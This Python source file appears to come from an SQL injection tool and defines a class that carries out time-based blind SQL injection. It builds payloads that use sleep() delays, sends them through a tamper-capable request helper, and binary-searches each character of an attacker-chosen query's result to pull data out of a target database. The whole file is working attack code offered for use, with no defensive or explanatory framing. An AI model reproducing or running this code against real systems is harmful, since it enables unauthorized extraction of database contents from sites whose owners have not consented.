import time

import requests

from sqli.tamper.Default import default
from sqli.payload import payload


class Timei:
    blindSql = "if(ascii(substr(({0}),{1},1))>{2},sleep(0.2),1)"
    method = 'GET'

    def __init__(self, http='', tamper=default()):
        self.http = http
        self.tamper = tamper

    def get(self, fuckSql):
        result = ''
        for i in range(1, 4096):
            l = 31
            r = 126
            mid = (l + r) >> 1
            while l < r:
                start_time = time.time()
                sql = self.blindSql.format(fuckSql, i, mid)
                req = payload(self.http, sql, self.tamper)

                if (time.time() - start_time) > 0.2:
                    l = mid + 1
                else:
                    r = mid
                mid = (l + r) >> 1
            if mid == 44:
                print(',')
            elif mid == 31:
                print()
                break
            else:
                print(chr(mid), end='')
            result += chr(mid)
        return result
